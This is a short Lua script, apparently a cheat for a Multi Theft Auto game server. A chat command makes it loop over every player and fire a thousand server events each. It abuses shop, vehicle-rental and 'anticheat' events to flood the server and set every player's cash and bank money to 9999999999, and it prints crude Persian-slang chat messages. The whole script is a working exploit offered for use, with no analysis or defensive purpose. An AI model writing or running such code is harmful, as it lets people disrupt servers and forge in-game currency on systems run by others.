function onCmd5()
    outputChatBox("SERVER KIR SHOD")
    for i,v in pairs (getElementsByType("player")) do 
        for i=1, 1000 do 
            triggerServerEvent("shop:removeMeFromCurrentShopUser", v, 85)
			-- Trigger 2 
			triggerServerEvent("rentveh:doPlayerRentVehicle", v, 85)
			
			triggerServerEvent("anticheat:changeEld", v, v, "money", 9999999999)
			outputChatBox("Money Add Shod!")
			
            triggerServerEvent("anticheat:changeEld", v, v, "bankmoney", 9999999999)
			outputChatBox("Bank Money Add Shod!!")

        end 
    end 
end 
addCommandHandler("off", onCmd5, false, false)
